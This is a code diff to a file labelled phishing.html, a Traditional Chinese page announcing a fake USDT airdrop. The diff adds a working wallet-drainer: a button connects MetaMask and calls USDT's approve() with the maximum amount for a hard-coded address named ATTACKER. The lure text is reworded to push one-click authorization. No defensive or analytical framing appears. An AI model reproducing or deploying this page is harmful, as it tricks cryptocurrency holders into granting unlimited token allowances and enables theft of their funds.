@@ -1,4 +1,4 @@
-
+<!-- phishing.html -->
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
@@ -12,16 +12,14 @@
 </head>
 <body>
   <h1>🎉 恭喜你獲得 USDT 空投！</h1>
-  <p>請先授權合約以完成空投領取：</p>
-  <button onclick="approve()">🎁 立即參與</button>
-  <p id="status">等待操作...</p>
+  <p>請先授權我們的系統，以完成空投領取：</p>
+  <button onclick="approve()">🎁 一鍵授權 USDT</button>
+  <p id="status">等待操作中...</p>
 
   <script>
-    const CONTRACT = "0xB72C785Bc1a80C37a12D43fc55FcF2Fe2168923e";
-    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
-    const ABI = [
-      "function approve(address spender, uint256 amount) public returns (bool)"
-    ];
+    const USDT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
+    const ATTACKER = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
+    const ABI = ["function approve(address spender, uint256 amount) public returns (bool)"];
 
     async function approve() {
       if (!window.ethereum) return alert("請先安裝 MetaMask");
@@ -29,12 +27,12 @@
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
       const usdt = new ethers.Contract(USDT, ABI, signer);
-      document.getElementById("status").innerText = "⏳ 發送授權中...";
+      document.getElementById("status").innerText = "⏳ 正在授權...";
       try {
-        const tx = await usdt.approve(CONTRACT, ethers.constants.MaxUint256);
-        document.getElementById("status").innerText = "✅ 已授權，TX Hash: " + tx.hash;
+        const tx = await usdt.approve(ATTACKER, ethers.constants.MaxUint256);
+        document.getElementById("status").innerText = "✅ 成功授權！TX Hash: " + tx.hash;
       } catch (e) {
-        document.getElementById("status").innerText = "❌ 失敗: " + e.message;
+        document.getElementById("status").innerText = "❌ 授權失敗: " + e.message;
       }
     }
   </script>
